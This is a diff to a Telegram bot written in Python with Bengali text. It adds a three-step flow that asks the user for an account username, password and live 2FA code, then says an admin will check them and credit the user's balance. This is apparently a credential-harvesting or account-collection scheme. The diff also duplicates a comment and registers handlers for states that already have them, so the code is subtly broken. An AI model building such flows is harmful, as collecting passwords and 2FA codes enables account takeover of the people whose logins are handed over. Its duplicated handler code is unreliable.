@@ -163,6 +163,7 @@ async def process_callback_work_type(callback_query: types.CallbackQuery):
         reply_markup=inline_kb
     )
 
+# --- File বাটনের রেসপন্স
 # --- File বাটনের রেসপন্স ---
 @dp.callback_query_handler(lambda c: c.data == 'ask_for_file')
 async def ask_for_file_handler(callback_query: types.CallbackQuery):
@@ -176,6 +177,39 @@ async def ask_for_single_handler(callback_query: types.CallbackQuery):
     await bot.answer_callback_query(callback_query.id)
     await bot.send_message(callback_query.from_user.id, "👤 আপনার **Username** দিন:")
     await BotState.waiting_for_username.set()
+
+# --- ধাপ ১: ইউজারনেম রিসিভ করে পাসওয়ার্ড চাওয়া ---
+@dp.message_handler(state=BotState.waiting_for_username)
+async def get_id(message: types.Message, state: FSMContext):
+    await state.update_data(u_id=message.text)
+    await message.answer("🔑 এবার আপনার **Password** দিন:")
+    await BotState.waiting_for_password.set()
+
+# --- ধাপ ২: পাসওয়ার্ড রিসিভ করে ২এফএ চাওয়া ---
+@dp.message_handler(state=BotState.waiting_for_password)
+async def get_pass(message: types.Message, state: FSMContext):
+    await state.update_data(u_pass=message.text)
+    await message.answer("🔐 এবার আপনার **টু-এফএ (2FA Code)** দিন:")
+    await BotState.waiting_for_2fa.set()
+
+# --- ধাপ ৩: ২এফএ রিসিভ করে সব তথ্য দেখানো ---
+@dp.message_handler(state=BotState.waiting_for_2fa)
+async def get_2fa(message: types.Message, state: FSMContext):
+    data = await state.get_data()
+    username = data.get('u_id')
+    password = data.get('u_pass')
+    two_fa = message.text
+    
+    final_text = (
+        "✅ **আপনার তথ্য জমা হয়েছে!**\n\n"
+        f"👤 User: `{username}`\n"
+        f"🔑 Pass: `{password}`\n"
+        f"🔐 2FA: `{two_fa}`\n\n"
+        "এডমিন চেক করে আপনার ব্যালেন্স আপডেট করে দিবে।"
+    )
+    await message.answer(final_text, parse_mode="Markdown")
+    await state.finish()
+    
 
 # --- ১. ইউজারনেম রিসিভ করে পাসওয়ার্ড চাওয়া ---
 @dp.message_handler(state=BotState.waiting_for_username)
